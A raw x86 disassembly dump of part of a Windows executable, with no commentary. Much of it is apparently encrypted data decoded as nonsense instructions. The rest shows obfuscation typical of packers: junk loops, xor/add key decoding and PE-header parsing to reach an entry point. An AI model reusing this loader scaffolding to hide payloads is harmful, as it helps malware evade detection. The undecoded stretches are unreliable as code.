  40618d:	sti    
  40618e:	mov    ah,0x82
  406190:	add    dh,ch
  406192:	jmp    0x406146
  406194:	daa    
  406195:	adc    ch,0xc8
  406198:	mov    gs,WORD PTR [esi+0x6e]
  40619b:	fwait
  40619c:	clc    
  40619d:	mov    dl,0x24
  40619f:	adc    eax,0xb1b89fe2
  4061a4:	into   
  4061a5:	dec    ebx
  4061a6:	sbb    al,0x59
  4061a8:	xor    DWORD PTR cs:[eax],eax
  4061ab:	enter  0x4944,0x4c
  4061af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061b0:	and    BYTE PTR [edi],cl
  4061b2:	jle    0x40615d
  4061b4:	cmp    eax,0x7beed5da
  4061b9:	cli    
  4061ba:	xchg   esp,eax
  4061bb:	pop    es
  4061bc:	ds jmp 0x40616c
  4061bf:	cld    
  4061c0:	add    DWORD PTR [ebp-0x7350736f],ecx
  4061c6:	daa    
  4061c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061c8:	mov    eax,ds:0xb68aaadd
  4061cd:	(bad)  
  4061ce:	mov    dl,0xa
  4061d0:	out    dx,eax
  4061d1:	inc    eax
  4061d2:	xchg   esi,eax
  4061d3:	add    ecx,DWORD PTR [ecx]
  4061d5:	aad    0xdc
  4061d7:	adc    BYTE PTR [ebx+edi*1-0x7eb9393e],0x6e
  4061df:	sub    bl,BYTE PTR [edi-0x64572a05]
  4061e5:	push   esp
  4061e6:	push   cs
  4061e7:	dec    edx
  4061e8:	lea    edi,[ecx+0x36]
  4061eb:	aad    0xc5
  4061ed:	sar    DWORD PTR [eax-0x52],1
  4061f0:	fs test al,0x3d
  4061f3:	push   esp
  4061f4:	dec    esi
  4061f5:	jnp    0x40626a
  4061f7:	push   ebx
  4061f8:	inc    ebx
  4061f9:	rcr    BYTE PTR [edx+0x60ee073e],0x24
  406200:	jge    0x4061b3
  406202:	jmp    0xeab80043
  406207:	sub    DWORD PTR [edx],ebx
  406209:	ficomp DWORD PTR [edi]
  40620b:	xchg   ebx,eax
  40620c:	jne    0x406190
  40620e:	mov    al,ds:0xaf1b9a46
  406213:	call   0x65cb:0xf6df3139
  40621a:	mov    ecx,0x59fa560b
  40621f:	cs add al,0x12
  406222:	add    DWORD PTR [eax+0x52],0x3a7c0eef
  406229:	enter  0x6709,0xc0
  40622d:	sbb    bh,bl
  40622f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406230:	dec    eax
  406231:	inc    edi
  406232:	pmaddwd mm7,QWORD PTR [esi-0x722af1cf]
  406239:	(bad)  
  40623b:	push   ss
  40623c:	iret   
  40623d:	arpl   WORD PTR ds:0xf72093b2,bx
  406243:	lods   al,BYTE PTR ds:[esi]
  406244:	xor    bh,BYTE PTR [esi+0x28]
  406247:	rcl    DWORD PTR [ebx-0x7e5ebdc1],1
  40624d:	pop    ebx
  40624e:	pop    es
  40624f:	mov    cl,0x48
  406251:	stc    
  406252:	mov    esi,0x3158f7ec
  406257:	dec    ebx
  406258:	mov    ds:0x8b4f1b49,eax
  40625d:	mov    esp,0xb99b96bc
  406262:	dec    cl
  406264:	xor    esi,eax
  406266:	and    DWORD PTR ds:0x4337a3,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x4337a3
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x4337a3,ecx
  406282:	cmp    DWORD PTR ds:0x4337a3,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x4337a3,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x4337a3,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x4337a3
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x4337a3,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	push   0x3c
  406313:	cwde   
  406314:	mov    bh,0x54
  406316:	aas    
  406317:	jle    0x406397
  406319:	sub    al,0x7d
  40631b:	jle    0x40639b
  40631d:	and    cl,BYTE PTR [ecx-0x65189758]
  406323:	or     edx,DWORD PTR [ebp-0x5f7b1908]
  406329:	test   al,0x5d
  40632b:	fisubr WORD PTR [ebx]
  40632d:	mov    ebx,0x602458f2
  406332:	sbb    BYTE PTR [esi],cl
  406334:	call   0x8521c27e
  406339:	in     al,dx
  40633a:	inc    ebp
  40633b:	sub    ch,al
  40633d:	cmp    edx,DWORD PTR [ebp+eiz*8+0x58]
  406341:	je     0x4063be
  406343:	jl     0x40632b
  406345:	imul   ebp,eax,0x4a
  406348:	loop   0x4062f4
  40634a:	and    al,0x31
  40634c:	ins    DWORD PTR es:[edi],dx
  40634d:	pop    ds
  40634e:	mov    al,ds:0xd3750eb
  406353:	xor    edi,DWORD PTR [edi+0x4a]
  406356:	js     0x4063a0
  406358:	in     al,dx
  406359:	push   edi
  40635a:	popf   
  40635b:	out    dx,al
  40635c:	shl    cl,1
  40635e:	rcr    DWORD PTR [esi],cl
  406360:	xchg   edx,eax
  406361:	aam    0x7d
  406363:	xchg   ecx,eax
  406364:	fcmovnu st,st(0)
  406366:	ret    
  406367:	dec    esi
  406368:	and    BYTE PTR [ebx],ah
  40636a:	push   edi
  40636b:	jno    0x406309
  40636d:	dec    edi
  40636e:	push   ebp
  40636f:	xor    DWORD PTR [ebx],esi
  406371:	dec    eax
  406372:	inc    edi
  406373:	sbb    DWORD PTR [esi+edx*2-0x27c6c2e2],eax
  40637a:	mov    ebp,ebp
  40637c:	ret    
  40637d:	leave  
  40637e:	push   DWORD PTR [edx+0x73]
  406381:	lea    eax,[eax+0x5795313]
  406387:	hlt    
  406388:	mov    ah,0xe3
  40638a:	and    DWORD PTR [edx+eax*4],ebx
  40638d:	arpl   WORD PTR [ecx+0x260f2f26],bp
  406393:	test   al,0xf4
  406395:	fidivr DWORD PTR ds:0x7f9ae075
  40639b:	call   0xaf63:0x1bbddd21
  4063a2:	(bad)  
  4063a3:	push   0x70
  4063a5:	mov    bl,0xfb
  4063a7:	mov    dh,bh
  4063a9:	mov    esp,0xb669dca0
  4063ae:	scas   eax,DWORD PTR es:[edi]
  4063af:	dec    esp
  4063b0:	mov    dh,0xbf
  4063b2:	iret   
  4063b3:	fmul   DWORD PTR gs:[eax+0x30]
  4063b7:	pop    ebx
  4063b8:	mov    eax,ds:0x29bffe5e
  4063bd:	cwde   
  4063be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063bf:	(bad)  [edi-0x414a682b]
  4063c5:	add    esi,ecx
  4063c7:	xchg   ebx,eax
  4063c8:	cmc    
  4063c9:	gs pop edi
  4063cb:	mov    bh,0x12
  4063cd:	xchg   edi,eax
  4063ce:	adc    al,0x16
  4063d0:	inc    edx
  4063d1:	(bad)  
  4063d3:	pop    ecx
  4063d4:	shl    DWORD PTR [edx+0x486b9046],0xb1
  4063db:	cmp    al,0xc
  4063dd:	out    dx,eax
  4063de:	inc    eax
  4063df:	or     esp,DWORD PTR ds:0xedf6e5c0
  4063e5:	cmp    BYTE PTR [eax+0x7f68fb27],ch
  4063eb:	fwait
  4063ec:	xor    al,0x85
  4063ee:	rcl    DWORD PTR ds:0x960665d6,0x11
  4063f5:	(bad)  
  4063f6:	push   edx
  4063f7:	push   edx
  4063f8:	test   DWORD PTR [edx-0x747f22e3],esi
  4063fe:	and    BYTE PTR [edi+0x3e1a55ff],ch
  406404:	cmp    bl,bh
  406406:	dec    edi
  406407:	lods   al,BYTE PTR ss:[esi]
  406409:	popf   
  40640a:	jo     0x406472
  40640c:	sub    eax,0x3723d5f6
  406411:	es push ecx
  406413:	xlat   BYTE PTR ds:[ebx]
  406414:	sbb    cl,BYTE PTR [edi-0x3b]
  406417:	add    edi,esp
  406419:	dec    edi
  40641a:	mov    esi,0xfed3f46c
  40641f:	in     eax,0xc4
  406421:	pop    ecx
  406422:	imul   ebx,DWORD PTR [ecx-0x45df0d93],0xffffffe5
  406429:	jl     0x4063c4
  40642b:	pop    es
  40642c:	push   edi
  40642d:	dec    ebp
  40642e:	or     al,0x3c
  406430:	xchg   BYTE PTR [eax],bh
  406432:	xor    BYTE PTR [esi-0x70],bh
  406435:	(bad)  
  406436:	fst    DWORD PTR [edx+0x47be07c7]
  40643c:	out    0xa7,eax
  40643e:	aad    0xa2
  406440:	mov    fs,ebx
  406442:	jle    0x4064c2
  406444:	test   eax,0xfc5d8607
  406449:	or     DWORD PTR [edi-0x7c],ebx
  40644c:	pop    es
  40644d:	dec    eax
  40644e:	dec    esi
  40644f:	repnz std 
  406451:	add    eax,0x2189b57c
  406456:	or     eax,DWORD PTR [edx-0x49864466]
  40645c:	retf   
  40645d:	push   ebp
  40645e:	adc    al,0xd
  406460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406461:	push   edx
  406462:	sbb    ebp,esi
  406464:	repnz mov WORD PTR [edx+ecx*2-0x7b97209e],ss
  40646c:	fs jl  0x4064ea
  40646f:	dec    ebp
  406470:	popf   
  406471:	sub    dl,dl
  406473:	xchg   esi,eax
  406474:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406475:	xor    DWORD PTR [edx+0x74568bcc],ecx
  40647b:	dec    esi
  40647c:	mov    esp,0xe1257ff0
  406481:	add    esi,DWORD PTR [ebp-0x5df43ef]
  406487:	rol    DWORD PTR [edi-0x433a4da],1
  40648d:	aas    
  40648e:	mov    ah,0x23
  406490:	jecxz  0x406506
  406492:	or     bh,BYTE PTR [esi-0x3efda0e7]
  406498:	fwait
  406499:	imul   ebp,DWORD PTR [ebp+0x5e2161f2],0x74ee36d
  4064a3:	mov    esp,0xb0afd0fb
  4064a8:	retf   
  4064a9:	adc    eax,0xfe697bba
  4064ae:	jle    0x4064dc
  4064b0:	sub    cl,BYTE PTR ds:0x7db91554
  4064b6:	ins    DWORD PTR es:[edi],dx
  4064b7:	pop    esi
  4064b8:	cmp    eax,0x8f537dd7
  4064bd:	call   0x2e7e:0x9e1b0585
  4064c4:	and    BYTE PTR [eax-0x5c],bh
  4064c7:	sbb    eax,0xc00123fa
  4064cc:	or     al,0xc6
  4064ce:	push   cs
  4064cf:	dec    ebx
  4064d0:	popf   
  4064d1:	xchg   DWORD PTR [esi],eax
  4064d3:	push   0xffffff83
  4064d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064d6:	pop    esp
  4064d7:	pushf  
  4064d8:	in     eax,0x63
  4064da:	test   al,0xb9
  4064dc:	in     al,0x0
  4064de:	shl    DWORD PTR [ebx+0x5a],1
  4064e1:	xchg   al,ah
  4064e3:	mov    dh,0x60
  4064e5:	cmp    edx,DWORD PTR [ecx+esi*1-0x19]
  4064e9:	xchg   dh,cl
  4064eb:	test   BYTE PTR [eax-0x76b0b9f3],al
  4064f1:	imul   esp,DWORD PTR [eax+0x59],0xffffffb7
  4064f5:	sbb    al,BYTE PTR [edx+ecx*1+0x70]
  4064f9:	jg     0x40652d
  4064fb:	mov    ch,0x95
  4064fd:	cwde   
  4064fe:	cmp    al,BYTE PTR [edx-0x6e298deb]
  406504:	bound  esp,QWORD PTR [ebx+0x742569c4]
  40650a:	add    DWORD PTR ds:0x6602bee2,0x65
  406511:	pusha  
  406512:	(bad)  
  406513:	cmp    edx,ebx
  406515:	mov    WORD PTR [edi],?
  406517:	std    
  406518:	sahf   
  406519:	or     al,0x7a
  40651b:	aaa    
  40651c:	sub    ebp,DWORD PTR [ecx-0x56]
  40651f:	xchg   DWORD PTR [edi],edi
  406521:	lock and DWORD PTR [edx+0x20],edx
  406525:	fwait
  406526:	and    dl,BYTE PTR ds:0xd67f924e
  40652c:	sbb    dh,BYTE PTR [esi+0x7f]
  40652f:	jecxz  0x4064d1
  406531:	pop    ds
  406532:	add    eax,0x1fddedc7
  406537:	push   eax
  406538:	test   al,0xf8
  40653a:	dec    ebx
  40653b:	add    al,0x10
  40653d:	dec    eax
  40653e:	test   al,0x63
  406540:	fmul   DWORD PTR [ecx]
  406542:	out    dx,eax
  406543:	neg    DWORD PTR [edi-0x9]
  406546:	fwait
  406547:	dec    edx
  406548:	xchg   edi,eax
  406549:	shr    esp,1
  40654b:	or     eax,0x5ab7f63f
  406550:	sub    al,BYTE PTR [ebx-0x73]
  406553:	lods   al,BYTE PTR fs:[esi]
  406555:	cmp    al,dh
  406557:	mov    cl,0x8d
  406559:	out    0x1f,al
  40655b:	and    eax,0xdd1342b
  406560:	mov    edi,0x27f98cd7
  406565:	aas    
  406566:	and    ecx,DWORD PTR [ebx+0x745476b4]
  40656c:	cld    
  40656d:	add    DWORD PTR [ebx],ebx
  40656f:	inc    ebx
  406570:	rcr    DWORD PTR [ebp+0x10],0x56
  406574:	mov    ebx,0x440dc961
  406579:	in     eax,0xc6
  40657b:	shl    ebx,1
  40657d:	pop    ebx
  40657e:	add    DWORD PTR [edi],eax
  406580:	inc    esi
  406581:	sub    edi,edx
  406583:	pop    eax
  406584:	aad    0x12
  406586:	lods   al,BYTE PTR ds:[esi]
  406587:	jl     0x40657c
  406589:	das    
  40658a:	sbb    DWORD PTR [ecx],ebx
  40658c:	xchg   edi,eax
  40658d:	pushf  
  40658e:	pop    edx
  40658f:	push   ds
  406590:	clc    
  406591:	xor    al,0xcb
  406593:	stos   DWORD PTR es:[edi],eax
  406594:	mov    ecx,0x4c6fb15a
  406599:	sbb    al,0x4e
  40659b:	les    ebp,FWORD PTR [eax+esi*1+0x432f0630]
  4065a2:	test   eax,0x470a1c9b
  4065a7:	pop    esi
  4065a8:	aas    
  4065a9:	add    DWORD PTR [ebp-0x7c],eax
  4065ac:	das    
  4065ad:	jl     0x406592
  4065af:	mov    ch,0x4a
  4065b1:	sbb    al,0xf3
  4065b3:	shr    BYTE PTR [eax+eax*8+0x20cec203],cl
  4065ba:	inc    ebp
  4065bb:	xor    edx,DWORD PTR [edi+0x4f]
  4065be:	or     eax,0xb9dd1d5a
  4065c3:	add    DWORD PTR [ebx-0x4a6accb8],ecx
  4065c9:	mov    bh,0x96
  4065cb:	shr    DWORD PTR [esi-0x730bc168],cl
  4065d1:	pop    ss
  4065d2:	pop    esp
  4065d3:	adc    eax,0xc7ef90b4
  4065d8:	jp     0x4065a9
  4065da:	adc    BYTE PTR [edi-0x2d],dh
  4065dd:	add    ecx,DWORD PTR [esi-0x58]
  4065e0:	(bad)  
  4065e1:	mov    bh,0x3b
  4065e3:	jo     0x5518
  4065e8:	and    bh,0xfa
  4065eb:	jbe    0x406639
  4065ed:	adc    al,BYTE PTR [eax+ebp*2+0x78740553]
  4065f4:	sub    eax,0x4c2959ba
  4065f9:	mov    esp,0x7f366b59
  4065fe:	cmp    DWORD PTR [ecx+0xe10aaec],eax
  406604:	(bad)  
  406605:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406606:	xor    edi,DWORD PTR [ecx+0x55]
  406609:	dec    esp
  40660a:	mov    ecx,DWORD PTR [ebx-0x49]
  40660d:	sbb    DWORD PTR [ecx+0x77a65ace],ebp
  406613:	fist   WORD PTR [ebx+0x41]
  406616:	outs   dx,DWORD PTR ds:[esi]
  406617:	ins    DWORD PTR es:[edi],dx
  406618:	push   0xffffff8a
  40661a:	inc    esp
  40661b:	test   ah,ah
  40661d:	nop
  40661e:	adc    BYTE PTR [eax-0x14],dl
  406621:	fsubr  st(1),st
  406623:	push   cs
  406624:	push   esp
  406625:	jne    0x4065ed
  406627:	pop    ds
  406628:	lea    edi,[ebp+0x6b]
  40662b:	dec    BYTE PTR [esi+esi*4+0x1]
  40662f:	int3   
  406630:	inc    edi
  406631:	jmp    0xcc0c:0x1d5f0c0f
  406638:	icebp  
  406639:	outs   dx,BYTE PTR ds:[esi]
  40663a:	xor    edi,esp
  40663c:	or     eax,0xcf7d584e
  406641:	add    al,0xa0
  406643:	(bad)  
  406645:	jmp    FWORD PTR [ecx]
  406647:	cld    
  406648:	mov    dl,0x15
  40664a:	das    
  40664b:	push   eax
  40664c:	test   DWORD PTR [ebp-0x162f00c8],esp
  406652:	add    eax,DWORD PTR [eax]
  406654:	add    BYTE PTR [eax],al
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x43367b,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x433753,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x433727,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x433763,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x433763
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x433763,ecx
  4066d8:	cmp    DWORD PTR ds:0x433763,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433883
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x433763,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x433763
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x433763,ecx
  406714:	cmp    DWORD PTR ds:0x433763,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x433757
  406728:	and    ecx,DWORD PTR ds:0x43368f
  40672e:	mov    DWORD PTR ds:0x433757,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43369b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x4337ab
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433693,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x4336eb,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433687,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433687
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433687,ebx
  40677d:	cmp    DWORD PTR ds:0x433687,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433687,0x23
  406791:	jne    0x4067a7
  406797:	push   0x4338b3
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x43372b,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433717,0x433727
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x433753
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x4336eb,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433693,0x43371f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433687,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x43372f
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x433763
  40683c:	and    DWORD PTR ds:0x433727,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x4337ab
  40684d:	or     DWORD PTR ds:0x433763,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x4336db,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43379f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x43372b
  406870:	sub    DWORD PTR ds:0x433753,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43368b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433687,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433693,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43368f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x4336a3,0x4337ab
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43371b,0x43375f
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x433767,0x433713
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x4336d3,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x4336db,0x43376f
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x43372b,0x4336ef
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x4336db,0x43371b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x43367b
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x43367b,0x4336a3
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x43375b
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x43367f,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x43376f,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43379b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43379b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43379b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43379b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43379b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433717
  4069db:	adc    ecx,DWORD PTR ds:0x4336df
  4069e1:	mov    DWORD PTR ds:0x433717,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433713,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x4336e7,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433713,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43368f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43371b
